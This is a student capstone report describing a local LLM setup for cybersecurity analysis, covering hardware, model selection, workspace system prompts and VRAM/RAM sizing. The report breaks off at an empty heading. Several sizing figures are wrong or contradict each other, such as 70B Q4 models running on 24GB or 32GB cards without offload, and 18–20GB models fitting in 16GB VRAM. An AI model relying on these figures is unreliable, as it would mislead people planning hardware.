# Local AI Infrastructure for Federal Cybersecurity Operations

**William Edward Beckham III**
Fayetteville Technical Community College
Artificial Intelligence Fundamentals — CSC-113-0901 | Spring 2026
Instructor: Andrew Norris | Class Dates: January 12 – May 13, 2026

---

## Overview

This project documents the design, testing, and deployment of a fully local AI infrastructure built for sensitive cybersecurity analysis work. The goal was to create a production-ready system capable of running large language models entirely on local hardware — no cloud, no external API calls, no data leaving the machine.

The motivating problem is real: federal cybersecurity roles at installations like Fort Bragg regularly involve analyzing threat intelligence, malware samples, and network traffic that cannot be transmitted to commercial cloud AI services like ChatGPT or Gemini due to data sovereignty and classification requirements. This system closes that gap.

---

## Course Context

This project was developed as the final capstone for CSC-113-0901 Artificial Intelligence Fundamentals at Fayetteville Technical Community College, progressing through the course module structure from initial ideation to final AI Showcase presentation.

**Relevant course outcomes this project addresses:**

- *Understand the fundamentals of AI and ML, including their history and development* — documented through the origin story, model library rationale, and deployment architecture comparison
- *Learn general techniques to use generative AI tools across different areas of investigation* — demonstrated through task-specific model routing across threat intelligence, code review, red team analysis, and documentation workflows
- *Develop critical skills to evaluate and select suitable AI tools for specific tasks* — evidenced by the cloud vs. local comparative test (January 24, 2026) and the model selection process documented with Claude AI assistance
- *Develop a practical semester project using AI* — this infrastructure is a fully operational production deployment, not a theoretical proposal

**Module progression:**

| Module | Topic | How This Project Relates |
|---|---|---|
| Module 4 | Find Your Project | Local AI infrastructure selected as final project |
| Module 5 | Design Your Project | Architecture decisions and model selection documented |
| Module 6 | Project: Sprint 1 | Core deployment — Ollama native Windows installation, model library |
| Module 7 | Project: Sprint 2 | AnythingLLM integration, workspace configuration, system prompts |
| Module 8 | Project: The Payoff | AI Showcase — full documentation and live demonstration |

---

## Origin Story

This project didn't start with a plan. In May 2025, I discovered Ollama while exploring what was possible with the hardware I already owned. I was curious whether I could run AI models locally, completely disconnected from cloud services. Within days of pulling my first model, I found I genuinely enjoyed it. What started as tinkering quickly became a serious side project.

By late May 2025, I had already downloaded and tested 18 different models — large general-purpose models, coding specialists, and domain-specific variants. The collection kept growing as I learned which models performed better for which tasks. Over the following months, through iterative testing across three different deployment architectures (native Windows, Docker, and WSL), I arrived at the current production setup documented here.

What started as personal curiosity evolved into directly applicable infrastructure for my target career path in federal cybersecurity. The connection became clear: federal analysts cannot send sensitive data to commercial AI APIs. A local AI setup that delivers strong analytical capability while maintaining complete data sovereignty is exactly what those environments need — and I had already built one.

---

## Hardware

### Core Architecture

| Component | Specification |
|---|---|
| CPU | AMD Ryzen 9 7900X @ 5.30GHz stable (±0.02 variance) — 12 Core / 24 Thread |
| Motherboard | ASUS ROG Crosshair X670E Hero (Rev 1.xx) |
| RAM | 64GB DDR5-5600 (air cooled) |
| GPU | Zotac RTX 4080 16GB VRAM (air cooled) |
| PSU | 850W+ certified |
| Case | Thermaltake Core P8 |
| OS | Windows 11 Pro (Build 26200.7623) |

### Cooling System

| Component | Specification |
|---|---|
| CPU Cooling | Custom closed-loop water cooling — EKWB Velocity 2 block, EKWB XE 360mm radiator (60mm thick), DDC pump, soft tubing |
| GPU Cooling | Air cooled — Zotac RTX 4080 stock cooling solution |

The CPU runs a custom water cooling loop for sustained thermal stability during long inference runs. The GPU relies on its stock air cooler, which handles the RTX 4080's thermal load adequately at the inference workloads used in this deployment. Sustained inference on large models does increase GPU temperatures compared to typical gaming use — temperatures should be monitored and case airflow verified to keep the RTX 4080 within safe operating range during extended analytical sessions.

### Why This Hardware

This system was not built for local AI. It was built as a high-end gaming and general-use workstation with future-proofing as the primary goal — invest once in hardware that stays relevant across multiple hardware generations rather than upgrading on a short cycle. The RTX 4080, 64GB DDR5, and Ryzen 9 7900X were selected with that philosophy in mind.

It just happens that those hardware choices work exceptionally well for local AI infrastructure.

When Ollama entered the picture in May 2025, no upgrades were needed. The system was already capable of running large models out of the box. The specs that make it a great long-term gaming rig — high VRAM, substantial system RAM, a strong multi-core CPU — are the same specs that matter for local model inference.

The RTX 4080's 16GB VRAM fits the 32B–33B model class that represents the best capability tradeoff for security analysis work. The 64GB of system RAM handles OS overhead, supporting applications, and offloading layers from models that exceed VRAM capacity. The Ryzen 9 7900X handles CPU-bound operations without bottlenecking the GPU. None of that was planned for AI — it was just good hardware that turned out to be the right hardware.

---

## Software Stack

| Layer | Tool | Version |
|---|---|---|
| Model runtime | Ollama | v0.21.2 |
| Chat interface | AnythingLLM | v1.10.0 |
| OS | Windows 11 Pro | Build 26200.7623 |

**Ollama** manages model downloads, versioning, and the local REST API that applications use to query models.

**AnythingLLM** sits on top of Ollama and provides the workspace interface — document ingestion, conversation history, multi-model switching, and RAG (retrieval-augmented generation) for querying against uploaded documents. This layer is critical for the threat intelligence correlation use case where analysts need to query AI against specific uploaded reports or CVE data.

---

## Model Library

Eight specialized models are deployed, each selected for specific analytical tasks. The library is the result of testing 18+ models and keeping what performed best per role.

| Model | Size | Primary Use |
|---|---|---|
| `qwen3:32b` | 20GB | Primary analysis and documentation — daily workhorse |
| `llama3.1:70b-instruct-q4_K_M` | 42GB | Advanced reasoning — quantized for VRAM fit |
| `deepseek-r1:32b` | 19GB | Specialized reasoning tasks, attack chain analysis |
| `deepseek-coder:33b-instruct` | 18GB | Programming, code analysis, vulnerability assessment |
| `qwen3-coder:30b` | 18GB | Code analysis, secure development support |
| `phi4-reasoning:14b` | 11GB | Logical reasoning, fast-response triage |
| `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` | 4.7GB | Security-specialized threat pattern recognition |
| `jimscard/blackhat-hacker:v2` | 9.2GB | Penetration testing perspective, red team analysis |

**Total deployed model storage: ~150GB**

### Model Selection Rationale

The current library did not arrive fully formed. It is the result of several months of research, testing, and deliberate pruning starting from a much larger experimental collection of 18+ models in May 2025. Claude AI was used throughout this process as a research tool — querying it to understand what each model class was designed for, what hardware constraints applied, and which models were worth prioritizing given the RTX 4080's 16GB VRAM ceiling.

A key constraint that shaped the final library came directly from that research process: **no model over ~42GB total size** — meaning everything had to fit within the combined VRAM + system RAM envelope without becoming unstable. Models that exceeded this were ruled out regardless of capability. The 70B Llama model is the single exception and runs with partial system RAM offload at reduced speed.

The following documents each model in the current library — what it is, why it was selected, and what role it fills that no other model in the library covers.

---

#### `qwen3:32b` — 20GB — Primary Analysis and Documentation

**What it is:** Qwen3 is Alibaba's third-generation large language model series. The 32B variant is the flagship of the mid-size range — strong general reasoning, excellent instruction following, and high-quality structured output generation.

**Why it was selected:** During model comparison testing in early 2025, Qwen3:32b consistently produced the best balance of output quality and response speed among the 30B–33B class models. At 3–5 tokens/second on the RTX 4080, it is fast enough for interactive use while producing analytical output that holds up against larger models on most tasks.

**Role in the library:** Daily workhorse. Default model for documentation, general analysis, drafting reports, summarizing documents, and any task that doesn't require a domain-specific specialist. When in doubt about which model to use, this is the one.

**Why nothing else covers this role:** The cybersecurity and coding specialists produce better output on their specific domains but are less reliable on general analytical tasks. The 70B model produces marginally better output on complex reasoning but at significantly higher latency. Qwen3:32b is the best general-purpose option that fits within practical speed constraints.

---

#### `llama3.1:70b-instruct-q4_K_M` — 42GB — Advanced Reasoning and Complex Analysis

**What it is:** Meta's Llama 3.1 at 70 billion parameters, quantized to 4-bit precision (Q4_K_M) to fit within the available hardware. At 70B parameters this is the largest model in the library and the most capable on complex multi-step reasoning tasks.

**Why it was selected:** Research conducted with Claude AI's assistance identified the 70B parameter class as the threshold where models demonstrate qualitatively better performance on tasks requiring sustained reasoning chains — threat campaign reconstruction, long document synthesis, and multi-factor analysis. Smaller models handle most tasks adequately, but for high-stakes analytical work where accuracy matters more than speed, the 70B model produces measurably better output.

The Q4_K_M quantization was specifically chosen as the best tradeoff between size and quality — it reduces the model from ~140GB at full precision to 42GB while preserving most of its reasoning capability.

**Role in the library:** Reserved for high-complexity tasks where depth matters more than latency — analyzing lengthy threat reports, reconstructing multi-stage attack campaigns, synthesizing information from multiple sources, and any task where a 32B model's output feels shallow or incomplete.

**Why nothing else covers this role:** No other model in the library approaches 70B parameters. The gap between 32B and 70B in reasoning quality is meaningful on complex tasks. This model exists specifically for when that extra capability is needed.

---

#### `deepseek-r1:32b` — 19GB — Specialized Reasoning and Attack Chain Analysis

**What it is:** DeepSeek R1 is a reasoning-specialized model from DeepSeek that was trained with reinforcement learning to produce explicit chain-of-thought reasoning. Unlike standard instruction-tuned models, R1 works through problems step by step before arriving at a conclusion — making its reasoning process visible and auditable.

**Why it was selected:** Claude AI recommended the DeepSeek R1 series specifically for tasks that require traceable multi-step logic — where you need to see *how* the model arrived at a conclusion, not just *what* it concluded. For cybersecurity work, this matters: when reconstructing an attack chain or assessing exploitation likelihood, the reasoning steps are as important as the final answer.

**Role in the library:** Attack chain reconstruction, threat impact assessment, and any analytical task where the reasoning process needs to be reviewed — not just the output. Also used for complex problem decomposition where breaking a task into explicit steps produces better results than prompting for a direct answer.

**Why nothing else covers this role:** Standard instruction-tuned models like Qwen3:32b produce answers directly without showing their work. R1's chain-of-thought design makes it fundamentally different in how it approaches problems — it fills a reasoning transparency role that no other model in the library provides.

---

#### `deepseek-coder:33b-instruct` — 18GB — Code Analysis and Vulnerability Assessment

**What it is:** DeepSeek Coder is a code-specialized model trained primarily on programming data across multiple languages. The 33B instruct variant is fine-tuned for instruction following in coding contexts — explaining code, writing code, reviewing code, and identifying problems in code.

**Why it was selected:** Early in the model selection process, testing showed that general-purpose models produced noticeably weaker results on code-specific tasks compared to models trained specifically on code. DeepSeek Coder:33b was identified — with Claude AI's guidance — as one of the strongest code-focused models available for local deployment at a size that fits within VRAM constraints. It handles multi-language code analysis and produces detailed explanations of vulnerabilities in a way that general models do not.

**Role in the library:** Code review, vulnerability identification, secure coding guidance, and analysis of malware or exploit code samples. Any task where the input is primarily code and the output needs to demonstrate genuine understanding of what the code does and what it risks.

**Why nothing else covers this role:** General models can read and discuss code but lack the depth of code-specific training. For serious vulnerability assessment work — the kind that matters in federal cybersecurity roles — a code-specialized model produces significantly better output.

---

#### `qwen3-coder:30b` — 18GB — Code Analysis and Secure Development Support

**What it is:** Qwen3 Coder is Alibaba's code-specialized variant of the Qwen3 model series, released in mid-2025. Like DeepSeek Coder, it is trained primarily on programming data, but it benefits from the Qwen3 architecture's improvements in instruction following and structured output.

**Why it was selected:** Added to the library after its release in summer 2025 based on recommendations from Claude AI that the Qwen3 Coder series represented a meaningful improvement over earlier code models at the same size class. Testing confirmed it performs well on code generation and review tasks, with particularly strong output on Python — directly relevant to the Python RPG project and security scripting work.

**Role in the library:** Complements DeepSeek Coder:33b. When one code model's output on a specific task seems incomplete or uncertain, running the same task through the other provides a second perspective. Also the preferred model for Python-specific work based on testing.

**Why it exists alongside DeepSeek Coder:** Having two strong code models enables cross-validation — a technique where the same piece of code is reviewed by both models and discrepancies are flagged for closer human review. In security work, a vulnerability missed by one model may be caught by another.

---

#### `phi4-reasoning:14b` — 11GB — Fast Reasoning and Rapid Triage

**What it is:** Phi-4 Reasoning is Microsoft's reasoning-specialized model in the Phi series, designed to deliver strong reasoning capability in a compact 14B parameter package. It was trained with techniques that prioritize logical reasoning performance at small model sizes.

**Why it was selected:** Claude AI identified the Phi-4 Reasoning model as the best option for situations where reasoning quality matters but response latency also matters — a middle ground between the fast-but-shallow small models and the slow-but-deep large models. At 11GB it loads quickly, fits entirely in VRAM, and responds faster than the 30B+ class models while producing more structured reasoning output than general 7B–14B models.

**Role in the library:** Rapid triage — quickly assessing whether a threat alert warrants deeper analysis, performing initial screening of code for obvious vulnerabilities, and any task where a fast reasoned response is more useful than a slow comprehensive one. Also useful as a "sanity check" model to quickly validate conclusions from larger models.

**Why nothing else covers this role:** The other reasoning models (R1:32b, 70B) are slow enough that using them for quick triage is inefficient. The cybersecurity specialist models are fast but domain-narrow. Phi4 fills the fast-reasoning gap that exists between the small general models and the large specialist ones.

---

#### `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` — 4.7GB — Threat Intelligence and Security Analysis

**What it is:** A purpose-built cybersecurity model fine-tuned specifically on threat intelligence data, CVE databases, attack pattern documentation, and security research literature. At 4.7GB it is the smallest model in the library but one of the most specialized.

**Why it was selected:** This model was one of the earliest additions to the library, identified during the May 2025 research phase when Claude AI specifically flagged purpose-trained cybersecurity models as producing qualitatively different output compared to general models asked cybersecurity questions. The ALIENTELLIGENCE model was recommended as the most accessible and well-regarded cybersecurity-specific model available through Ollama at that time.

Testing confirmed the recommendation — on threat intelligence prompts, this model produces output structured around threat actor TTPs, MITRE ATT&CK classifications, and operational security context in a way that general models do not replicate without extensive prompting.

**Role in the library:** Primary model for threat intelligence analysis, CVE assessment, CISA alert triage, and any task that requires interpreting security data through the lens of established threat frameworks. The Threat Intelligence workspace in AnythingLLM is configured exclusively around this model.

**Why nothing else covers this role:** General models can discuss threat intelligence but lack the domain-specific fine-tuning that makes responses operationally structured. The difference between a general model and this one on a threat intelligence task is the difference between a knowledgeable generalist and a trained analyst.

---

#### `jimscard/blackhat-hacker:v2` — 9.2GB — Red Team and Adversarial Perspective

**What it is:** A model fine-tuned to reason from an adversarial perspective — approaching systems, configurations, and scenarios the way an attacker would. Designed for red team analysis, penetration testing planning, and attack surface enumeration.

**Why it was selected:** Claude AI's guidance during the model selection process identified this as filling a role that no other model type covers — the explicit adversarial perspective. In cybersecurity, understanding how an attacker sees a system is as important as understanding how a defender sees it. General models tend to default to defensive framing even when asked for offensive analysis. This model is specifically trained to maintain the adversarial perspective consistently.

**Role in the library:** Red team exercises, attack surface analysis, penetration testing planning, and reviewing defensive configurations from an attacker's viewpoint. Any task where the question is "how would an attacker approach this?" rather than "how do we defend this?"

**Why nothing else covers this role:** The cybersecurity specialist model approaches security from a defensive and analytical posture. This model approaches it from an offensive posture. Both perspectives are necessary for complete security analysis — identifying what to defend requires understanding what will be attacked and how.

---

## Task Routing

A core design decision in this system is not using a single model for everything. Each analytical task is routed to the model best suited for it:

| Task Type | Model |
|---|---|
| Threat intelligence analysis | `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` |
| Code review / vulnerability assessment | `deepseek-coder:33b-instruct` |
| Red team / penetration testing perspective | `jimscard/blackhat-hacker:v2` |
| Attack chain reconstruction | `deepseek-r1:32b` |
| Long document analysis / complex reasoning | `llama3.1:70b-instruct-q4_K_M` |
| General analysis and documentation | `qwen3:32b` |

This approach mirrors how a real SOC team operates — different analysts with different specializations handle different problem types. The model library reflects that same division of responsibility.

---

## Installation and Setup

For installation and configuration procedures, refer to the official documentation:

- **Ollama Installation:** [https://ollama.com](https://ollama.com) — Download and setup guides for Windows, macOS, and Linux
- **Ollama Documentation:** [https://docs.ollama.com](https://docs.ollama.com) — Model management, API usage, and configuration
- **AnythingLLM Download:** [https://anythingllm.com](https://anythingllm.com) — Desktop application installer
- **AnythingLLM Documentation:** [https://docs.anythingllm.com](https://docs.anythingllm.com) — Workspace setup, LLM provider configuration, and RAG implementation

This deployment uses Ollama v0.21.2 as the model runtime and AnythingLLM v1.10.0 as the workspace interface, both running natively on Windows 11 Pro.

---

## Deployment Architecture: Why Native Windows

Three deployment architectures were fully implemented and tested before committing to the production setup. This was not a theoretical comparison — each approach ran real analytical workloads on the same hardware.

### Architecture 1: Docker Desktop + ngrok (Tested, Rejected)

**What was tested:** Ollama running inside a Docker container, with ngrok providing external tunnel access for remote querying.

**Why it was rejected:**
- Container overhead measurably reduced inference speed — every token generation passed through an additional abstraction layer
- GPU passthrough in Docker Desktop on Windows adds configuration complexity and reduces VRAM utilization efficiency
- Deployment and maintenance overhead added friction without benefit for a single-user setup
- The ngrok dependency introduced an external network component that contradicts the air-gap design goal — data sovereignty requires zero external dependencies

### Architecture 2: WSL (Tested, Rejected)

**What was tested:** Ollama running inside a WSL2 Linux environment on the same hardware.

**Why it was rejected:**
- The WSL2 abstraction layer introduced latency compared to native execution on identical hardware
- Hardware resource utilization (VRAM, RAM) was less efficient than direct OS access
- GPU driver integration between WSL2 and the Windows NVIDIA driver stack introduced instability on sustained workloads
- Performance degraded noticeably on long inference runs compared to the native baseline

### Architecture 3: Native Windows Installation (Current Production)

**Why it works:**
- Direct hardware access — Ollama communicates with the RTX 4080 through native NVIDIA drivers with no virtualization layer
- Maximum VRAM utilization efficiency
- Simpler maintenance — no container lifecycle, no WSL environment to manage
- Stable, consistent performance on sustained analytical workloads
- Zero external network dependencies — complete air-gap capability

**The core lesson:** Containerization and virtualization solve real problems — portability, isolation, multi-tenancy. This use case doesn't have those problems. Accepting the overhead of those solutions without needing their benefits is a net performance loss. For a single-user, single-machine deployment optimized for maximum inference performance, native installation is the correct architecture.

---

## Performance

Inference speeds vary significantly by model size. The figures below come from direct testing on the production hardware (RTX 4080 16GB) running Ollama v0.21.2 on Windows 11 Pro.

| Model | Size | Measured Speed | Notes |
|---|---|---|---|
| `qwen3:32b` | 20GB | 3–5 tokens/second | Confirmed benchmark — primary workhorse |
| `phi4-reasoning:14b` | 11GB | Faster than 32B | Smaller footprint, lower latency |
| `deepseek-coder:33b-instruct` | 18GB | Similar to qwen3:32b | Comparable size class |
| `deepseek-r1:32b` | 19GB | Similar to qwen3:32b | Comparable size class |
| `llama3.1:70b-instruct-q4_K_M` | 42GB | Slower than 32B class | Partial VRAM offload to system RAM |

The 3–5 tokens/second figure is specifically measured on `qwen3:32b`. Smaller models run faster; the 70B model runs slower due to partial offload beyond the 16GB VRAM ceiling. For analytical work — reading threat reports, drafting assessments, reviewing code — these speeds are operationally acceptable. A 4-minute response from a local model analyzing a full threat report is significantly faster than a human analyst doing the same work manually, and the data never left the machine.

All inference stays fully local. No query data leaves the machine under any circumstances.

---

## Cloud vs. Local AI: Comparative Test Results

**Test Date:** January 24, 2026

To validate the local infrastructure against commercial cloud alternatives, four tools were tested head-to-head across identical prompts. This comparison directly informed the tool selection strategy used in this deployment.

### Tools Tested

| Tool | Type | Data Handling |
|---|---|---|
| Gemini 2.5 Flash | Cloud (Google) | Queries transmitted to and processed by Google servers |
| Claude 3.5 | Cloud (Anthropic) — Free Tier | Data processed by Anthropic |
| ChatGPT 3.5 | Cloud (OpenAI) — Free Tier | Data stored by OpenAI, potential training data use |
| Qwen3:32B via Ollama | Local | Zero external transmission — complete air-gap |

### Test Results

| Prompt | Tool | Response Time | Quality (1–5) | Notes |
|---|---|---|---|---|
| Simple explanation | Gemini | 2s | 5 | Clear, structured. Data sent to Google. |
| | Claude | 3s | 4 | Good quality. Data processed by Anthropic. |
| | ChatGPT | 2.5s | 5 | Excellent balance. Data stored by OpenAI. |
| | **Qwen3:32B** | 2m 15s | 5 | High quality. **Zero data transmission.** |
| Haiku | Gemini | 2s | 4 | Creative. Query logged by Google. |
| | Claude | 2.5s | 5 | Vivid, emotionally engaging. Anthropic retention. |
| | ChatGPT | 2s | 5 | Poetic and concise. OpenAI training data potential. |
| | **Qwen3:32B** | 1m 45s | 4 | Creative. No external data exposure. |
| Table (ML vs. Programming) | Gemini | 3s | 5 | Perfect structure. Corporate data mining risk. |
| | Claude | 4s | 4 | Minor formatting issues. Third-party processing. |
| | ChatGPT | 3s | 4 | Accurate formatting. Data retention concerns. |
| | **Qwen3:32B** | 3m 20s | 5 | Excellent output. Air-gapped security. |
| GitHub learning plan | Gemini | 5s | 5 | Comprehensive. Google analytics tracking. |
| | ChatGPT | 5s | 5 | College-focused approach. OpenAI data policies apply. |
| | Claude | 6s | 4 | Basic plan. Anthropic terms of service. |
| | **Qwen3:32B** | 4m 45s | 5 | Detailed cybersecurity focus. Complete data control. |

### Key Findings

**Cloud tools:** 2–6 second response times across all tests. Output quality competitive with local models on general tasks. Critical limitation — every query is transmitted to, processed by, and potentially retained by a private corporation subject to government data requests. Zero data sovereignty.

**Local Qwen3:32B:** 1m 45s to 4m 45s response times depending on task complexity. Output quality matched or exceeded cloud tools on every structured analytical task (tables, plans, detailed explanations). Complete data sovereignty — no transmission, no retention, no third-party access.

### Tool Selection Strategy Derived from Testing

**Primary use — local Ollama deployment:**
- Any query involving sensitive data, internal system details, or security analysis
- All threat intelligence work, code review, and red team analysis
- Any task where data sovereignty is non-negotiable

**Limited cloud use acceptable:**
- Public research using already-public information
- Speed-critical formatting of non-sensitive content

**Operational rule:** Assume any cloud query could be retained, analyzed, or subpoenaed. When in doubt, run it locally.

---

## Relevance to Federal Cybersecurity

The federal cybersecurity environment has a fundamental constraint that commercial AI tools cannot address: classified and sensitive data cannot leave controlled systems. Cloud-based AI services — regardless of their capability — are not usable for the analytical work that matters most in those environments.

This infrastructure directly addresses that constraint. Every capability available here — threat intelligence analysis, code vulnerability assessment, red team perspective generation, attack chain reconstruction — operates with complete data sovereignty. Asset inventory data, network traffic captures, and malware samples stay on the local machine.

This is the type of infrastructure that federal SOC environments need but typically lack the internal deployment knowledge to build. This project demonstrates both the technical capability to build it and the operational security reasoning behind every design choice.

---

## AnythingLLM: Workspace Architecture

AnythingLLM is the workspace interface layer that sits on top of Ollama. While Ollama handles the model runtime and inference, AnythingLLM provides everything above that — workspaces, document ingestion, conversation history, system prompt management, and per-workspace model assignment.

### Workspace Design

Workspaces are AnythingLLM's core organizational unit. Each workspace is an isolated environment with its own:

- Assigned AI model
- System prompt
- Document library (for RAG)
- Conversation history

This is what enables the task-routing strategy — rather than manually switching models for each query, you open the workspace designed for that task and the right model and prompt are already configured.

The workspaces used in this deployment:

| Workspace Name | Model Assigned | Purpose |
|---|---|---|
| Threat Intelligence | `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` | CISA alerts, CVE triage, threat pattern analysis |
| Code Review | `deepseek-coder:33b-instruct` | Vulnerability assessment, code auditing |
| Red Team | `jimscard/blackhat-hacker:v2` | Adversarial perspective, attack surface analysis |
| Attack Chain | `deepseek-r1:32b` | Multi-step reasoning, campaign reconstruction |
| Deep Analysis | `llama3.1:70b-instruct-q4_K_M` | Long documents, complex reasoning tasks |
| General | `qwen3:32b` | Documentation, drafting, general analysis |

### System Prompts

The system prompt is the persistent instruction set that shapes how the model behaves in every conversation within a workspace. It is sent automatically at the start of every chat — the user never has to re-explain context, role, or behavioral expectations.

**Example system prompt — Threat Intelligence workspace:**

```
You are a senior cybersecurity threat intelligence analyst. Your role is to analyze 
threat data, identify attack patterns, correlate indicators of compromise, and produce 
structured assessments for SOC operations. When reviewing alerts or CVE data, always 
address: threat actor TTPs, affected asset classes, exploitation likelihood, and 
recommended mitigations. Format analytical outputs with clear section headers. 
Prioritize operational relevance over theoretical discussion.
```

**Example system prompt — Red Team workspace:**

```
You are an experienced penetration tester and red team operator. Analyze targets, 
systems, and configurations from an adversarial perspective. Identify attack vectors, 
exploitation paths, and defensive gaps. Present findings as an attacker would — 
enumerate what is visible, what is exploitable, and what the likely impact is. 
Assume a professional engagement context with explicit authorization.
```

**Example system prompt — Code Review workspace:**

```
You are a secure code reviewer specializing in vulnerability assessment. When analyzing 
code, identify: injection vulnerabilities, authentication flaws, insecure data handling, 
improper error handling, and dependency risks. Reference CVE identifiers and CWE 
classifications where applicable. Provide remediation recommendations with corrected 
code examples.
```

### How System Prompts Carry Across All Chats

This is one of the most operationally significant features of AnythingLLM's workspace model and is worth understanding clearly.

**The system prompt is not a message you send — it is the persistent context of the workspace itself.** Every time you open a new chat within a workspace, AnythingLLM automatically prepends the system prompt to the conversation before your first message. The model receives it as its foundational instruction set for that session.

This means:

- You never have to re-explain role, context, or behavioral expectations at the start of a session
- Every chat in the Threat Intelligence workspace behaves like a threat analyst from message one
- Every chat in the Code Review workspace applies secure coding analysis from message one
- Switching between workspaces is effectively switching between pre-configured analyst roles
- New chats within the same workspace inherit the same prompt — consistency is automatic

**Practical impact:** An analyst opening the Threat Intelligence workspace and pasting in a CISA alert gets an immediate structured analysis — threat actor TTPs, affected asset classes, recommended mitigations — without any setup conversation. The workspace did that work ahead of time.

**System prompt persistence across workspace updates:** If you edit a workspace's system prompt, the updated prompt applies to all new chats going forward. Existing chat histories retain the prompt that was active when those conversations occurred.

---

## The Importance of VRAM and System RAM

Hardware resources are the single largest constraint in local AI deployment. Understanding why VRAM and RAM matter — and what happens when you don't have enough of either — is essential for anyone planning or evaluating a similar infrastructure.

---

### VRAM: Why 16GB Is the Practical Minimum for This Use Case

VRAM (Video RAM on the GPU) is where the model weights live during inference. When you run a query, the model doesn't read from disk — it reads from VRAM. If the model doesn't fit in VRAM, it either fails to load or offloads layers to system RAM, which dramatically reduces inference speed.

**Model size vs. VRAM requirements at common quantization levels:**

| Model Size | FP16 (full precision) | Q8 | Q4_K_M (4-bit) |
|---|---|---|---|
| 7B parameters | ~14GB | ~7GB | ~4GB |
| 13B parameters | ~26GB | ~13GB | ~7GB |
| 32–33B parameters | ~64GB | ~32GB | ~18GB |
| 70B parameters | ~140GB | ~70GB | ~42GB |

The RTX 4080's 16GB VRAM fits:
- Any 7B or 13B model at full or high precision
- 32B–33B models at Q4 quantization (some VRAM margin left)
- 70B models only at aggressive Q4 quantization with partial system RAM offload

**What happens with less or more VRAM:**

- **8GB VRAM (e.g., RTX 4060):** Limited to 7B models at Q4. Anything larger requires heavy system RAM offload, dropping inference speed to 0.5–1 token/second — barely usable for analytical work.
- **12GB VRAM (e.g., RTX 5070):** Can run 13B models well and 33B models at aggressive quantization with significant quality degradation.
- **16GB VRAM (e.g., RTX 4080 / RTX 5080 / RTX 5070 Ti):** Fits the 32B–33B model class at Q4 — the current sweet spot for capable local AI inference.
- **24GB VRAM (e.g., RTX 4090):** Can run 33B models at Q8 and 70B models at Q4 without system RAM offload.
- **32GB VRAM (e.g., RTX 5090):** Can run 70B models at Q8 quality and opens the door to 100B+ parameter models that are otherwise impractical on consumer hardware.
- **96GB VRAM (NVIDIA RTX PRO 6000 Blackwell):** Fits 70B models entirely in VRAM at FP8 precision with ~26GB of headroom remaining. Enables 32B models at full FP16 quality with no offload, multiple simultaneous model instances, and production-scale inference workloads. At $8,500–$9,200, this is commercial workstation territory — not a personal build, but the benchmark for what a federal AI operations deployment would look like on a single workstation.

**The 16GB sweet spot:** The RTX 4080's 16GB fits the 32B–33B models that represent the best capability/cost tradeoff for security analysis work. These models are analytically capable enough for real threat intelligence work while running at 3–5 tokens/second — operationally usable speeds.

---

### System RAM: Why 64GB Matters

System RAM plays a different but equally critical role in local AI deployment.

**Primary functions of system RAM in this context:**

1. **Model layer offloading** — When a model is too large to fit entirely in VRAM, Ollama offloads some layers to system RAM. The 70B model at Q4 (42GB) exceeds the 4080's 16GB VRAM — the overflow runs in system RAM. More RAM means more layers can be offloaded without crashing, and the model degrades gracefully rather than failing.

2. **Operating system and concurrent processes** — Windows 11 Pro with background services, AnythingLLM, a browser, and other tools can easily consume 16–20GB of RAM before inference begins. 64GB ensures the OS and support stack never compete with the model for memory.

3. **Multiple simultaneous operations** — Running a large model while also processing documents in AnythingLLM, running security tools, or operating other applications requires RAM headroom that 16GB or 32GB systems don't have.

4. **Future model growth** — Model sizes are increasing. 64GB provides runway for larger models that don't exist yet or weren't practical when this system was built.

**What happens with insufficient system RAM:**

- **16GB total system RAM:** With 8–12GB consumed by the OS and applications, only 4–8GB remains for model offload. Large models will fail to load or crash mid-inference on sustained workloads.
- **32GB total system RAM:** Workable for most 32B models but creates memory pressure during multi-tasking. The 70B model becomes unreliable.
- **64GB total system RAM:** Comfortable headroom for the full model library, OS overhead, and concurrent applications without memory pressure.

---

### The Combined Effect: VRAM + RAM Working Together

The highest performance scenario is when the entire model fits in VRAM — system RAM is not involved in inference at all, and the GPU handles every computation directly. This is the fast path: 3–5 tokens/second.

When a model exceeds VRAM and offloads to system RAM, inference speed drops because data must transfer across the PCIe bus between the GPU and system memory on every layer computation that uses offloaded weights. The more layers offloaded, the slower the inference.

**Rule of thumb for this deployment:**

- Models ≤16GB → fit entirely in VRAM → full speed (3–5 tokens/second)
- Models 16–42GB → partial offload to system RAM → moderate speed reduction
- Models >42GB → significant offload → slower, but 64GB system RAM prevents failure

This is why the hardware configuration in this project was not arbitrary — 16GB VRAM and 64GB system RAM were selected together as a matched pair to support the specific model library being deployed.

---

### How VRAM and System RAM Work Together to Expand Model Capacity

The key insight is that VRAM and system RAM are not independent constraints — they function as a combined memory pool for model inference. The total addressable capacity for a model is approximately VRAM + available system RAM, with VRAM being the fast tier and system RAM the slower offload tier.

Upgrading either component expands what you can run. Upgrading both compounds the benefit.

**Combined capacity vs. runnable model size (Q4 quantization):**

| VRAM | System RAM | Combined Usable | Largest Practical Model (Q4) |
|---|---|---|---|
| 4GB | 16GB | ~12GB usable | 7B only — not a viable deployment |
| 8GB | 32GB | ~28GB usable | 13B well, 20B with offload |
| 12GB | 32GB | ~32GB usable | 20B–30B with moderate offload (RTX 5070) |
| 16GB | 32GB | ~38GB usable | 32B with offload, 70B marginal (RTX 4080 / 5080 / 5070 Ti) |
| 16GB | 64GB | ~68GB usable | 32B at speed, 70B reliably (this deployment) |
| 24GB | 64GB | ~80GB usable | 70B well, 100B+ experimental (RTX 4090) |
| 32GB | 64GB | ~88GB usable | 70B at full Q8 quality, 100B+ viable (RTX 5090) |
| 32GB | 128GB | ~150GB usable | 100B+ models, approaching frontier scale (RTX 5090) |
| 96GB | 256GB+ | ~340GB+ usable | 70B at FP8 in VRAM only, 200B+ with offload, multiple simultaneous models (RTX PRO 6000 Blackwell) |

> The "combined usable" figure is approximate — OS overhead, application memory, and PCIe bandwidth constraints all affect real-world performance. These figures represent practical operational capacity, not theoretical maximums.

**The upgrade priority order:** If you are resource-constrained, upgrade VRAM first — it has the largest impact on inference speed since it is the fast tier. Upgrading system RAM extends what you can *run* but at slower speeds due to PCIe offload. The optimal configuration maximizes both.

---

### How Local Models Compare to Commercial AI in Parameter Scale

A frequent question when evaluating local AI is how open-source models compare to the commercial services they are replacing. The answer requires some nuance — commercial providers do not publish exact parameter counts — but credible estimates based on research papers, benchmark performance, and industry analysis give a reasonable picture.

**Estimated parameter counts for major commercial models:**

